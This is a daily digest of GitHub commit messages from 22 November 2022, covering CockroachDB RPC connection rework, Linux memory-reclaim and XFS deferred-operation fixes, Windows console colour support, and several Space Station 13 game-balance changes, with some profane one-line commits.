## *good gosh*

It's so many stuff on **github**! Here's one more attempt to *get a grip*. And
an [index](docs/messages.md).

---

# [2022-11-22](docs/good-messages/2022/2022-11-22.md)


2,125,169 events recorded by [gharchive.org](https://www.gharchive.org/) of which 2,125,169 were push events containing 3,197,374 commit messages that amount to 251,241,285 characters filtered with [words.py@e23d022007...](https://github.com/defgsus/good-github/blob/e23d022007992279f9bcb3a9fd40126629d787e2/src/words.py) to these 63 messages:


## [cockroachdb/cockroach](https://github.com/cockroachdb/cockroach)@[f50670b344...](https://github.com/cockroachdb/cockroach/commit/f50670b3440e91bec05aebc1bc425e4dd465583f)
#### Tuesday 2022-11-22 00:07:53 by Tobias Grieger

rpc: re-work connection maintenance

This commit simplifies the `rpc` package.

The main aim is to make the code and the logging it produces somewhat
clearer and to pave the way for an ultimate merging of `nodedialer` with
`rpc` as well as adoption of the `util/circuit` package (async-based
circuit breaker).

`rpc.Context` hadn't aged well. Back in the day, it was a connection
pool that held on to connections even when they failed. The heartbeat
loop would run forever and its latest outcome would reflect the health
of the connection. We relied on gRPC to reconnect the transport as
necessary.

At some point we realized that leaving the connection management to
gRPC could cause correctness issues. For example, if a node is de-
commissioned and brought up again, gRPC might reconnect to it but
now we have a connection that claims to be for node X but is actually
for node Y. Similarly, we want to be able to vet that the remote
node's cluster version is compatible with ours before letting any
messages cross the connection.

To achieve this, we added `onlyOnceDialer` - a dialer that fails
all but the first attempt to actually connect, and in particular
from that point on connections were never long lived once they
hit a failure state.

Still, the code and testing around the heartbeat loop continued
to nurture this illusion. I found that quite unappealing as it
was sure to throw off whoever would ultimately work on this code.

So, while my original impetus was to produce better log messages
from `rpc.Context` when there were connection issues, I took
the opportunity to simplify the architecture of the code to
reflect what it actually does.

In doing so, a few heartbeat-related metrics were removed, as they made
limited sense in a world where failing connections get torn down (i.e.
our world).

Connection state logging is now a lot nicer. Previously, one would very
frequently see the onlyOnceDialer's error "cannot reuse client
connection" which, if one is not familar with the concept of the
onlyOnceDialer is completely opaque, and for those few in the know is an
unhelpful error - you wanted the error that occurred during dialing.

I paid special attention to the "failfast" behavior. If connections
don't stay in the pool when they are unhealthy, what prevents us from
dialing down nodes in a tight loop? I realized that we got lucky with
our use of onlyOnceDialer because it would always prompt gRPC to do
one retry, and at a 1s backoff. So, the connection would stay in the
pool for at least a second, meaning that this was the maximum frequency
at which we'd try to connect to a down node.

My cleanups to onlyOnceDialer in pursuit of better logging elimitated
this (desirable) property. Instead we now skip the log messages should
they become too frequent. I claim that this is acceptable for now since
the vast majority of callers go through a `node.Diaelr`, which has a
circuit breaker (letting callers through at most once per second).

We previously configured gRPC with a 20s dial timeout. That means that
if a remote is unreachable, we'd spend 20s just trying to dial it,
possibly tying up callers that could be trying a reachable node in the
meantime. That seemed wildly too large; I am reducing it to 5s here
which is still generous (but there's a TLS handshake in here so better
not make it too tight).

We previously tried to re-use connections that were keyed with a NodeID
for dial attempts that didn't provide a NodeID. This caused some issues
over the years and was now removed; the extra RPC connections are
unlikely to cause any issues.

The internal connection map is now a plain map with an RWMutex. This is
just easier and gets the job done. The code has simplified as a result
and it's clearer that it's correct (which it repeatedly was not in the
past).

I implemented redactability for gRPC's `status.Status`-style errors,
so they format nicer and at least we get to see the error code (the
error message is already flattened when gRPC hands us the error,
sadly).

There are various other improvements to errors and formatting. The
following are excerpts from the health channel when shutting down
another node in a local cluster:

Connection is first established:

> [n3,rnode=1,raddr=‹127.0.0.1:26257›,class=system,rpc] 3  connection is now ready

n1 goes down, i.e. existing connection is interrupted (this error comes
from `onlyOnceDialer`):

> [n3,rnode=1,raddr=‹127.0.0.1:26257›,class=system,rpc] 35  closing
connection after: ‹rpc error: code = Unavailable desc = connection
error: desc = "transport: Error while dialing connection interrupted
(did the remote node shut down or are there networking issues?)"›

Reconnection attempts; these logs are spaced 1-2s apart:

> [n3,rnode=1,raddr=‹127.0.0.1:26257›,class=system,rpc] 37  unable to
connect (is the peer up and reachable?): initial connection heartbeat
failed: ‹rpc error: code = Unavailable desc = connection error: desc =
"transport: Error while dialing dial tcp 127.0.0.1:26257: connect:
connection refused"›

n3 is back up:

> [n3,rnode=1,raddr=‹127.0.0.1:26257›,class=system,rpc] 49  connection is now ready

There are other connection errors in the logs that stem from operations
checking for a healthy connection, failing to get through circuit
breakers, etc., such as these:

> [n3,intExec=‹claim-jobs›,range-lookup=/Table/15/4/‹NULL›] 33  unable
to connect to n1: failed to check for ready connection to n1 at
‹127.0.0.1:26257›: ‹connection not ready: TRANSIENT_FAILURE›

Release note (general change): Previously, CockroachDB employed a 20s
connection timeout for cluster-internal connections between nodes.  This
has been reduced to 5s to potentially reduce the impact of network
issues.

Release note (general change): Previously, CockroachDB (mostly) shared a
TCP connection for the KV and Gossip subsystems. They now use their own
connection each, so the total number of outgoing and incoming TCP
connections at each node in the cluster will increase by 30 to 50
percent.

---
## [theOOZ/Skyrat-tg](https://github.com/theOOZ/Skyrat-tg)@[317aea0435...](https://github.com/theOOZ/Skyrat-tg/commit/317aea043510ee0c3591ff3a06fdffd360fdfc29)
#### Tuesday 2022-11-22 00:25:23 by Jolly

[FUCK] [NO GBP] Yeah, fixes something in NuInterlink(?) (#17544)

fucking GODDAMNIT

---
## [Dav999-v/VVVVVV](https://github.com/Dav999-v/VVVVVV)@[86d90a1296...](https://github.com/Dav999-v/VVVVVV/commit/86d90a1296739adef30b224f41e3a6ab55069a48)
#### Tuesday 2022-11-22 00:26:16 by Misa

Add color support to Windows console output, properly

This adds color support to the output of the console on Windows. Now if
you're using Windows 10 build 1511 or later (I think it's build 1511
anyway; they added more VT sequence support in later versions), you will
see colors by default. This isn't due to Windows helping in any way;
this commit has to specifically enable it with SetConsoleMode() because
by default, Windows won't enable color support unless we enable it. (Or
if it's enabled in the registry, but having to go through the registry
to enable basic shit like that is completely fucking stupid.)

I tested this in my Windows 10 virtual machine and it's completely
working.

---
## [JoeBidenWhatAreYouHiding/kx](https://github.com/JoeBidenWhatAreYouHiding/kx)@[ebf66d8fcb...](https://github.com/JoeBidenWhatAreYouHiding/kx/commit/ebf66d8fcb6ac653f11a99f27e0444a334fbe7dc)
#### Tuesday 2022-11-22 01:14:31 by poggepoggin

TURN THE LIGHTS OFF, HOW THE FUCK YOU QUIET WITH THE MIC ON

---
## [newstools/2022-daily-post-nigeria](https://github.com/newstools/2022-daily-post-nigeria)@[365ff953f0...](https://github.com/newstools/2022-daily-post-nigeria/commit/365ff953f017fb518df4c56427ac69591bb98c61)
#### Tuesday 2022-11-22 01:22:17 by Billy Einkamerer

Created Text For URL [dailypost.ng/2022/11/21/ondo-23-year-old-lady-attempts-suicide-over-alleged-breakup-with-boyfriend/]

---
## [sjp38/linux](https://github.com/sjp38/linux)@[fb032319b1...](https://github.com/sjp38/linux/commit/fb032319b103b57db657697231b491f5cd4fc8df)
#### Tuesday 2022-11-22 01:23:11 by Johannes Weiner

mm: vmscan: fix extreme overreclaim and swap floods

During proactive reclaim, we sometimes observe severe overreclaim, with
several thousand times more pages reclaimed than requested.

This trace was obtained from shrink_lruvec() during such an instance:

    prio:0 anon_cost:1141521 file_cost:7767
    nr_reclaimed:4387406 nr_to_reclaim:1047 (or_factor:4190)
    nr=[7161123 345 578 1111]

While he reclaimer requested 4M, vmscan reclaimed close to 16G, most of it
by swapping.  These requests take over a minute, during which the write()
to memory.reclaim is unkillably stuck inside the kernel.

Digging into the source, this is caused by the proportional reclaim
bailout logic.  This code tries to resolve a fundamental conflict: to
reclaim roughly what was requested, while also aging all LRUs fairly and
in accordance to their size, swappiness, refault rates etc.  The way it
attempts fairness is that once the reclaim goal has been reached, it stops
scanning the LRUs with the smaller remaining scan targets, and adjusts the
remainder of the bigger LRUs according to how much of the smaller LRUs was
scanned.  It then finishes scanning that remainder regardless of the
reclaim goal.

This works fine if priority levels are low and the LRU lists are
comparable in size.  However, in this instance, the cgroup that is
targeted by proactive reclaim has almost no files left - they've already
been squeezed out by proactive reclaim earlier - and the remaining anon
pages are hot.  Anon rotations cause the priority level to drop to 0,
which results in reclaim targeting all of anon (a lot) and all of file
(almost nothing).  By the time reclaim decides to bail, it has scanned
most or all of the file target, and therefor must also scan most or all of
the enormous anon target.  This target is thousands of times larger than
the reclaim goal, thus causing the overreclaim.

The bailout code hasn't changed in years, why is this failing now?  The
most likely explanations are two other recent changes in anon reclaim:

1. Before the series starting with commit 5df741963d52 ("mm: fix LRU
   balancing effect of new transparent huge pages"), the VM was
   overall relatively reluctant to swap at all, even if swap was
   configured. This means the LRU balancing code didn't come into play
   as often as it does now, and mostly in high pressure situations
   where pronounced swap activity wouldn't be as surprising.

2. For historic reasons, shrink_lruvec() loops on the scan targets of
   all LRU lists except the active anon one, meaning it would bail if
   the only remaining pages to scan were active anon - even if there
   were a lot of them.

   Before the series starting with commit ccc5dc67340c ("mm/vmscan:
   make active/inactive ratio as 1:1 for anon lru"), most anon pages
   would live on the active LRU; the inactive one would contain only a
   handful of preselected reclaim candidates. After the series, anon
   gets aged similarly to file, and the inactive list is the default
   for new anon pages as well, making it often the much bigger list.

   As a result, the VM is now more likely to actually finish large
   anon targets than before.

Change the code such that only one SWAP_CLUSTER_MAX-sized nudge toward the
larger LRU lists is made before bailing out on a met reclaim goal.

This fixes the extreme overreclaim problem.

Fairness is more subtle and harder to evaluate.  No obvious misbehavior
was observed on the test workload, in any case.  Conceptually, fairness
should primarily be a cumulative effect from regular, lower priority
scans.  Once the VM is in trouble and needs to escalate scan targets to
make forward progress, fairness needs to take a backseat.  This is also
acknowledged by the myriad exceptions in get_scan_count().  This patch
makes fairness decrease gradually, as it keeps fairness work static over
increasing priority levels with growing scan targets.  This should make
more sense - although we may have to re-visit the exact values.

Link: https://lkml.kernel.org/r/20220802162811.39216-1-hannes@cmpxchg.org
Signed-off-by: Johannes Weiner <hannes@cmpxchg.org>
Reviewed-by: Rik van Riel <riel@surriel.com>
Acked-by: Mel Gorman <mgorman@techsingularity.net>
Cc: Hugh Dickins <hughd@google.com>
Cc: Joonsoo Kim <iamjoonsoo.kim@lge.com>
Cc: <stable@vger.kernel.org>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>

---
## [Avalon-Benchmark/avalon](https://github.com/Avalon-Benchmark/avalon)@[c4de56a4d9...](https://github.com/Avalon-Benchmark/avalon/commit/c4de56a4d9afcb2af061684f1ff913f104ebbc01)
#### Tuesday 2022-11-22 02:17:30 by Zack Polizzi

Merge branch 'zack/mac_install' into 'main'

Update docs for formatting; update formatters to modern packages

I was trying to fix my local formatter setup and that sorta snowballed into cleaning up a bunch of related stuff. Now setting up a local environment should be painless, and I updated black and isort to the latest versions because we were running some really old stuff. The new ones have some nice new features and bugfixes.

- improved docs for setting up a local environment
- removed ray (pretty sure unused now) and downgraded openturns by one minor version which the author said was identical (to get it to be installable on mac)
- cleaned up the pyfixfmt lock files and instructions. public usage is already on the github repo; reorienting the files in our repo to be aimed at internal usage. the lock files were kinda broken so i just updated everything to the most recent version and pinned those in a proper requirements file.
- updated pyfixfmt to be compatible with the latest versions of black and isort - the versions we were using were 2+ years old.
- redid isort configuration to work with isort 5.0. now, missing packages will automatically be classified as third-party, which should reduce the dependence on having your environment set up properly. as you can see in the diff, this already has fixed a bunch of stuff.
- re-formatted the whole codebase with the new versions. the most notable change is that spaces around exponent operations were removed (https://github.com/psf/black/issues/538); everything else is quite minor.
- removed black and isort from the research dockerfile - we never use these tools in a container, do we?


Once merged, I'll post in engineering to have everyone update to the new versions.

See merge request generally-intelligent/generally_intelligent!419

Source: fcf664ad3bf53a38bfadf717e0f79c127a92102f

---
## [treckstar/yolo-octo-hipster](https://github.com/treckstar/yolo-octo-hipster)@[363c7e8ddb...](https://github.com/treckstar/yolo-octo-hipster/commit/363c7e8ddbc2c9cf0f0ff16eb3522032ebc53cdf)
#### Tuesday 2022-11-22 02:22:03 by treckstar

People listen up don't stand so close, I got somethin that you all should know. Holy matrimony is not for me, I'd rather die alone in misery.

---
## [Irishstevie/dpemotes](https://github.com/Irishstevie/dpemotes)@[fadbae861b...](https://github.com/Irishstevie/dpemotes/commit/fadbae861b8eadf7aa6b2ef469797c2b6602ba23)
#### Tuesday 2022-11-22 02:44:02 by TayMcKenzieSA

Implemented More Walkstyles Found In Menyoo

You don't own any code, get a life, stay the fuck out of my DMs, touch grass, stop claiming shit to be yours.

---
## [ZephyrTFA/tgstation](https://github.com/ZephyrTFA/tgstation)@[b77cf7c120...](https://github.com/ZephyrTFA/tgstation/commit/b77cf7c1205d466b8cb242cd3302891e82b44da2)
#### Tuesday 2022-11-22 02:50:25 by Iamgoofball

Hotkey-based inventory management now applies the click cooldown to prevent it from being abusable in combat scenarios. (#71325)


About The Pull Request

Hotkey-based inventory management now applies the click cooldown to prevent it from being abusable in combat scenarios.
Why It's Good For The Game

Players have been deploying unbelievable levels of abuse with these hotkeys having completely uncapped speeds.
I watched one cheater do automated inventory management using storage items and weirdly named empty pills to use as inventory delimiters.
Resolves people being able to have a baton hidden in their backpack and then activate and baton someone with it in 0.1 seconds without moving their mouse cursor off of their target.

Players should not be able to interact with their inventory faster than someone moving a mouse and clicking the left mouse button. This cripples the game balance and puts anyone with a worse internet connection, slower reaction speeds, or laggier computer at a distinct disadvantage against people who can macro their inventory management.

I can set up autohotkey so that I can withdraw a stun baton from my backpack, turn it on, and then click someone by just holding down a key and pressing M1 over someone. This shit needs to stop.

If a do_after() on hotkey management is too harsh, we can apply a combat click cooldown every time you use the hotkeys instead to discourage combat macro abuse.
Swapped it over to a click cooldown.
Changelog

cl
balance: Hotkey-based inventory management now applies the click cooldown to prevent it from being abusable in combat scenarios.
/cl

---
## [Paxilmaniac/tgstation](https://github.com/Paxilmaniac/tgstation)@[25d4afc869...](https://github.com/Paxilmaniac/tgstation/commit/25d4afc869585373571da5ba4a77fb967ffdedfe)
#### Tuesday 2022-11-22 03:56:41 by Iamgoofball

Retires explosive lance crafting to a nice farm upstate where it has plenty of room to run around (#71256)

## About The Pull Request

You can no longer craft explosive lances.

## Why It's Good For The Game

Explosive lances are unhealthy for the game in it's current iteration.
Many years ago when the game was more loose and we weren't dealing with
players who treat the game like competitive TTT or Town of Salem,

They are a one shot kill weapon, which is the most powerful kind of
weapon in every gamemode. @JohnFulpWillard likened it to 1f1, a concept
from Town of Salem players where the town trades 1 person for 1 bad guy.

Modern ss13 design includes a significantly heavier load of antagonists
that aren't fixed roundstart compared to when the e-lance went in.

When we added the e-lance, if nuke ops spawned, that was it, there was
nuke ops, if you e-lanced the nuke ops and died you were dead until the
next round.

Nowadays you're rolling for lone operative, blob, wizard, disease,
revenant, and every other fun enjoyable antagonist role under the sun.

I can e-lance a nuke op/cultist/traitor/revolutionary/any bad guy in the
game as a non-antag assistant, die, and have a good chance to roll
another, way more fun antag in deadchat.

My change to make the e-lance a proper "we both die" tool didn't
actually help because I didn't quite realize that to the modern SS13
player because of how we designed Dynamic and antagonists in the modern
era, death is, frankly, not a punishment anymore.

It's time we admit the facts, items designed in 2015 SS13 in #12389
simply don't hold up in a healthy manner in 2022 SS13. Dying in SS13 in
2015 was a significantly different experience with different
consequences than it has now, and right now "kills you when you use it"
is not the same massive downside it was 7-8 years ago.

## Changelog
:cl:
del: You can no longer craft explosive lances.
/:cl:

---
## [Wallemations/heavenstation](https://github.com/Wallemations/heavenstation)@[84a85c827d...](https://github.com/Wallemations/heavenstation/commit/84a85c827d71b3326b482444a204711de38cf518)
#### Tuesday 2022-11-22 04:35:56 by lizardqueenlexi

Removed TRAIT_PLASMABURNT, fixed plasma river limb transformation. (#71157)

## About The Pull Request

Resolves #67282.

As originally designed, plasma rivers (namely, those on Icebox, though
the turf was originally made for the Snowdin away mission) are meant to
literally strip the flesh from your bones, leaving you with plasmaman
limbs. I'm not certain when this broke entirely, although it seems to
have never been updated to work alongside Kapulimbs.

Transformation of limbs into plasmaman limbs used to be accomplished by
adding the "PLASMABURNT" trait to limbs. However, this trait in the
current code is entirely meaningless, only checked in the proc that
makes plasmamen catch fire. Essentially, the only "interaction" is
having your flesh melted off by a plasma river, donating that specific
limb to a plasmaman, and pranking them with the fact that that specific
limb will still make them burst into flames.

Exciting.

I've removed the trait entirely, as it does functionally nothing, and
restored the ability of plasma rivers to turn your limbs - and
eventually, you - into plasmaman equivalents.

To be honest, I'm not _entirely_ satisfied with the plasmaman
transformation process - it doesn't especially suit the lore of
plasmamen, and if you transform into one in the plasma rivers you'll
probably immediately die from Icemoon's atmosphere anyway. However, this
is something I'd prefer to revisit in a later PR.
## Why It's Good For The Game

There's little reason _not_ to remove a trait that does nothing.

As for plasmafication, it's a fun interaction that was already _meant_
to be there. The message about your flesh melting off has always
printed, even while it's doing exactly nothing to you. It's cool to fall
into the deadly plasma river and come away from it permanently scarred
with a weird skeleton limb. Turning into a plasmaman entirely is
unlikely to happen and will probably just kill you, but it's a fun and
weird way to be dead.
## Changelog
:cl:
del: Removed the useless "plasmaburnt" trait.
fix: Restored a broken interaction with plasma rivers that slowly
transforms you into a plasmaman.
/:cl:

---
## [tgstation/tgstation](https://github.com/tgstation/tgstation)@[590847bdf7...](https://github.com/tgstation/tgstation/commit/590847bdf742b1e53f05ea700d48ec0676cdcf43)
#### Tuesday 2022-11-22 04:57:15 by Andrew

Biogenerator tweaks, leather makes more belts and clothing (#71175)

## About The Pull Request

### Revamped the biogenerator UI:


https://user-images.githubusercontent.com/3625094/200973283-b703f21b-c747-493e-98d9-043eef86d410.mp4

### Changed biogenerator icon to use layers and see the biomass level:


https://user-images.githubusercontent.com/3625094/201396065-caeaa412-6676-46f6-875e-efa2dca34985.mp4

### Biogenerator rebalance:

- Now you don't need the beaker to print solid products.
- Biogenerator now accepts all food, not just plants.
- Biogenerator now treats all nutriment subtypes as nutriments, so
vitamins and proteins also turn into biomass.
- Biomass now has the same units as other reagents (you get 5 biomass
from 5 nutrient with tier 1 parts).
- Doubled the cost of all items and reagents. (biomass generation
reduced by 10 and prices - by 5)
- Chemicals output amounts are now in units and you can select how much
you want to output exactly. It will not let you specify more than the
size of container or above 50 units with one button click.
- Reduced the amount of stored items and introduced a limit to the
biomass, both tied to the matter bin tier.

### Recipes changes:

Made biogenerator more dumb by moving the clothing out from the
biogenerator designs, and extending leather recipes instead.

The biogenerator is a grinder/recycler style machine so it doesn't make
sense that it outputs clothing.
Also you need to make leather to craft the toolbelt, while you can't do
the same to craft job-specific belts.
Now you can print leather in biogenerator and craft the leather clothing
by using the leather in-hand.
And the rice hat is now crafted from bamboo, instead of biogenerator.

Also added paper to the biogenerator recipes as it makes stuff from
cellulose and barely anyone knows that you can craft paper from 1 log
and 50 water. And paper is needed in large quantities to craft some
items, like paper frames.

And it doesn't output a pack of rolling paper. It's dumb now. It prints
the rolling paper sheets instead.

## Why It's Good For The Game

Biogenerator had terrible UX and backend logic. I didn't improve much on
BE though, but now it should be less frustrating to use.

Also I hate how biogenerator is superior to all other means of obtaining
its products. It doesn't make sense to grow and grind wheat, for
instance, when you can just throw shit into biogenerator and get the
flour fast. And the costs are ridiculous - you can get a couple of
bottles of fertilizers just from one medium potato.

It honestly begs for more nerfing, at least to make the nutriment -
chemicals exchange rate 1:1.

The reason for the biomass cap is because people use it as a sink for
veggies and generate infinite biomass. Maybe the limit will make them
care more about the part upgrade and offload some of the veggies to the
fridge for the Cook.

Also it was weird that biogenerator could tailor some things, while
others have to be crafted in-hand. Now you can print leather and craft
all types of belts and leather clothing.

## Changelog
:cl:
refactor: biogenerator UI revamped
qol: biogenerator no longer requires beaker for materials, monkey cubes
and nori
balance: biogenerator accepts all food, not just plants
balance: biogenerator treats all nutriment subtypes as nutriments
(vitamins, protein, etc.)
balance: biogenerator product prices doubled
balance: biogenerator biomass storage is limited depending on the level
of matter bins
balance: cowboy boots recipe moved from crafting to leather recipes
balance: leather clothing & belt recipes moved from biogenerator to
leather recipes
balance: rice hat recipe moved from biogenerator to bamboo recipes
balance: biogenerator now outputs rolling paper sheets instead of a pack
add: biogenerator can now print paper
imageadd: biogenerator icons now use overlays, have emissive layer and
indicate the biomass volume
/:cl:

---
## [Dabger1/tgstation](https://github.com/Dabger1/tgstation)@[de662db397...](https://github.com/Dabger1/tgstation/commit/de662db39763674f850977dabc8bbe66388d2c9b)
#### Tuesday 2022-11-22 05:06:23 by Sol N

Excercise Equipment is now craftable (#71190)

## About The Pull Request

Imagine if you will a humble chaplain who wants nothing more than for
all of the spiritual folk on the station to get as massive gains as they
can, after finding that they can not just make more exercise equipment
and that the station does not have any in public places, they go annoy
security enough to get into permabrig only to find out that they cant
even unwrench the equipment and move it to the church!!!

NOT ANYMORE!!!


![jS2aBMBa0B](https://user-images.githubusercontent.com/116288367/200889423-f1b6365c-24c4-4f45-8ca4-c96c9085cf27.png)
crafting recipies


![dreamseeker_O4BgBRsFa8](https://user-images.githubusercontent.com/116288367/200889002-8dd7c927-0745-46a9-a4bc-578c7279042a.gif)
demonstrating unwrenching and wrenching equipment


![dreamseeker_hCFQJZdzoS](https://user-images.githubusercontent.com/116288367/200889019-5f4c8399-d539-4d84-8a3f-7735c3ba1f68.gif)
crafting a punching bag and punching it

Now you can craft as much exercise equipment as you want! May everyone
on the station get as strong as possible and not just prisoners.

Also I changed the message that plays when you try to use exercise
equipment someone else is using into a balloon alert.

![dreamseeker_PwNesmcR1f](https://user-images.githubusercontent.com/116288367/200890964-4f9fa3ee-ce07-4e6e-815c-a3f4593d06b1.png)

## Why It's Good For The Game

Access to exercise equipment on some maps is limited to static positions
and is currently mostly only for prisoners as every map does not have
public exercise equipment. Expanding the access means that you can have
a Drill Sargent Head of Security or Captain who commands people use
these or allows a psychologist to prescribe healthy exercise habits to
their patients.

I think having the potential for exercise equipment on every map is more
fun and also if prisoners get their hands on tools they should be
allowed to mess with these to annoy security or aid in their escape.

## Changelog
:cl:
add: the punching bag, bench press, and chest press are all able to be
crafted and unanchored.
add: crafting recipes for the above
qol: changed a chat message into a balloon alert
qol: adds screentips to equipment (thanks for suggesting i do this
mothblocks!)
/:cl:

---
## [chandanr/linux](https://github.com/chandanr/linux)@[6016516b1b...](https://github.com/chandanr/linux/commit/6016516b1b0c098b961c5ed7fff6c75174d02706)
#### Tuesday 2022-11-22 05:23:42 by Darrick J. Wong

xfs: change the order in which child and parent defer ops are finished

commit 27dada070d59c28a441f1907d2cec891b17dcb26 upstream.

The defer ops code has been finishing items in the wrong order -- if a
top level defer op creates items A and B, and finishing item A creates
more defer ops A1 and A2, we'll put the new items on the end of the
chain and process them in the order A B A1 A2.  This is kind of weird,
since it's convenient for programmers to be able to think of A and B as
an ordered sequence where all the sub-tasks for A must finish before we
move on to B, e.g. A A1 A2 D.

Right now, our log intent items are not so complex that this matters,
but this will become important for the atomic extent swapping patchset.
In order to maintain correct reference counting of extents, we have to
unmap and remap extents in that order, and we want to complete that work
before moving on to the next range that the user wants to swap.  This
patch fixes defer ops to satsify that requirement.

The primary symptom of the incorrect order was noticed in an early
performance analysis of the atomic extent swap code.  An astonishingly
large number of deferred work items accumulated when userspace requested
an atomic update of two very fragmented files.  The cause of this was
traced to the same ordering bug in the inner loop of
xfs_defer_finish_noroll.

If the ->finish_item method of a deferred operation queues new deferred
operations, those new deferred ops are appended to the tail of the
pending work list.  To illustrate, say that a caller creates a
transaction t0 with four deferred operations D0-D3.  The first thing
defer ops does is roll the transaction to t1, leaving us with:

t1: D0(t0), D1(t0), D2(t0), D3(t0)

Let's say that finishing each of D0-D3 will create two new deferred ops.
After finish D0 and roll, we'll have the following chain:

t2: D1(t0), D2(t0), D3(t0), d4(t1), d5(t1)

d4 and d5 were logged to t1.  Notice that while we're about to start
work on D1, we haven't actually completed all the work implied by D0
being finished.  So far we've been careful (or lucky) to structure the
dfops callers such that D1 doesn't depend on d4 or d5 being finished,
but this is a potential logic bomb.

There's a second problem lurking.  Let's see what happens as we finish
D1-D3:

t3: D2(t0), D3(t0), d4(t1), d5(t1), d6(t2), d7(t2)
t4: D3(t0), d4(t1), d5(t1), d6(t2), d7(t2), d8(t3), d9(t3)
t5: d4(t1), d5(t1), d6(t2), d7(t2), d8(t3), d9(t3), d10(t4), d11(t4)

Let's say that d4-d11 are simple work items that don't queue any other
operations, which means that we can complete each d4 and roll to t6:

t6: d5(t1), d6(t2), d7(t2), d8(t3), d9(t3), d10(t4), d11(t4)
t7: d6(t2), d7(t2), d8(t3), d9(t3), d10(t4), d11(t4)
...
t11: d10(t4), d11(t4)
t12: d11(t4)
<done>

When we try to roll to transaction #12, we're holding defer op d11,
which we logged way back in t4.  This means that the tail of the log is
pinned at t4.  If the log is very small or there are a lot of other
threads updating metadata, this means that we might have wrapped the log
and cannot get roll to t11 because there isn't enough space left before
we'd run into t4.

Let's shift back to the original failure.  I mentioned before that I
discovered this flaw while developing the atomic file update code.  In
that scenario, we have a defer op (D0) that finds a range of file blocks
to remap, creates a handful of new defer ops to do that, and then asks
to be continued with however much work remains.

So, D0 is the original swapext deferred op.  The first thing defer ops
does is rolls to t1:

t1: D0(t0)

We try to finish D0, logging d1 and d2 in the process, but can't get all
the work done.  We log a done item and a new intent item for the work
that D0 still has to do, and roll to t2:

t2: D0'(t1), d1(t1), d2(t1)

We roll and try to finish D0', but still can't get all the work done, so
we log a done item and a new intent item for it, requeue D0 a second
time, and roll to t3:

t3: D0''(t2), d1(t1), d2(t1), d3(t2), d4(t2)

If it takes 48 more rolls to complete D0, then we'll finally dispense
with D0 in t50:

t50: D<fifty primes>(t49), d1(t1), ..., d102(t50)

We then try to roll again to get a chain like this:

t51: d1(t1), d2(t1), ..., d101(t50), d102(t50)
...
t152: d102(t50)
<done>

Notice that in rolling to transaction #51, we're holding on to a log
intent item for d1 that was logged in transaction #1.  This means that
the tail of the log is pinned at t1.  If the log is very small or there
are a lot of other threads updating metadata, this means that we might
have wrapped the log and cannot roll to t51 because there isn't enough
space left before we'd run into t1.  This is of course problem #2 again.

But notice the third problem with this scenario: we have 102 defer ops
tied to this transaction!  Each of these items are backed by pinned
kernel memory, which means that we risk OOM if the chains get too long.

Yikes.  Problem #1 is a subtle logic bomb that could hit someone in the
future; problem #2 applies (rarely) to the current upstream, and problem

This is not how incremental deferred operations were supposed to work.
The dfops design of logging in the same transaction an intent-done item
and a new intent item for the work remaining was to make it so that we
only have to juggle enough deferred work items to finish that one small
piece of work.  Deferred log item recovery will find that first
unfinished work item and restart it, no matter how many other intent
items might follow it in the log.  Therefore, it's ok to put the new
intents at the start of the dfops chain.

For the first example, the chains look like this:

t2: d4(t1), d5(t1), D1(t0), D2(t0), D3(t0)
t3: d5(t1), D1(t0), D2(t0), D3(t0)
...
t9: d9(t7), D3(t0)
t10: D3(t0)
t11: d10(t10), d11(t10)
t12: d11(t10)

For the second example, the chains look like this:

t1: D0(t0)
t2: d1(t1), d2(t1), D0'(t1)
t3: d2(t1), D0'(t1)
t4: D0'(t1)
t5: d1(t4), d2(t4), D0''(t4)
...
t148: D0<50 primes>(t147)
t149: d101(t148), d102(t148)
t150: d102(t148)
<done>

This actually sucks more for pinning the log tail (we try to roll to t10
while holding an intent item that was logged in t1) but we've solved
problem #1.  We've also reduced the maximum chain length from:

    sum(all the new items) + nr_original_items

to:

    max(new items that each original item creates) + nr_original_items

This solves problem #3 by sharply reducing the number of defer ops that
can be attached to a transaction at any given time.  The change makes
the problem of log tail pinning worse, but is improvement we need to
solve problem #2.  Actually solving #2, however, is left to the next
patch.

Note that a subsequent analysis of some hard-to-trigger reflink and COW
livelocks on extremely fragmented filesystems (or systems running a lot
of IO threads) showed the same symptoms -- uncomfortably large numbers
of incore deferred work items and occasional stalls in the transaction
grant code while waiting for log reservations.  I think this patch and
the next one will also solve these problems.

As originally written, the code used list_splice_tail_init instead of
list_splice_init, so change that, and leave a short comment explaining
our actions.

Signed-off-by: Darrick J. Wong <darrick.wong@oracle.com>
Reviewed-by: Dave Chinner <dchinner@redhat.com>
Reviewed-by: Brian Foster <bfoster@redhat.com>
Signed-off-by: Chandan Babu R <chandan.babu@oracle.com>

---
## [tgstation/tgstation](https://github.com/tgstation/tgstation)@[1409e4b026...](https://github.com/tgstation/tgstation/commit/1409e4b026f359764ca491fd5f73f646227973e6)
#### Tuesday 2022-11-22 07:29:37 by LemonInTheDark

JPS Optimization (Light Botcode) (#70623)



## About The Pull Request

Alright. So.
Right now, JPS works like this:
```
code requests path
we enter the actual pathfinding
pathfinding sleeps when it overruns a tick
if it sleeps, it'll then wake up before the mc starts
continue
```
This has annoying side effects. Primarily that we have no real control
over JPS, we just sorta have to eat its cost.
So if there's like 10 different things pathfinding at once, the mc will
have no time to do anything. Hell we might even end up eating into
maptick's time if the jps work is expensive enough (note the cost of
sleeping is not accounted for, and that has overhead)
This has happen before, usually when someone makes a lot of bots, and
it's really annoying.

So then, lets put JPS on a subsystem. That way the MC has control over
it.
But wait, existing code expects to yield and get back a path list, and
that's a sane request.
This is solvable, but requires abusing pass by reference lists, and the
ability to make callbacks into partials (preinsert arguments into them
before they're called, and accept other args later)

Because of this, we can now pass callbacks into pathfinders, allowing
for async use, rather then JUST yielding.

Of note: I've removed the 10 pathfinding datums limit, since
ratelimiting like that is handled nicely by the MC.
I've also removed the 15 second timeout, since mc yielding would trigger
it too often. I'm unsure if this means we don't have exit conditions for
pathfinding, need to talk to ryll. (@Ryll-Ryll what happens if jps just
like, fails to find a path?)

Also of note: I think bots will fire off more then one pathfinding
attempt at a time if their first takes too long to complete. This is
dumb, why do we do this?

Optimizes JPS by more then 40% by removing redundant for(thing in turf)
loops, and avoiding making proc calls if objects are non dense.
This makes things slightly more fragile, but saves a LOT of time. I
think it's worth it, tho talking to mso it might be possible to do
better. Maybe I should do a LINDA system style thing. (I did a linda
system style thing I fixed it)

Optimizes botscanning, fixes bots not seeing things adjacent to them
The list of types could be a cached typecache
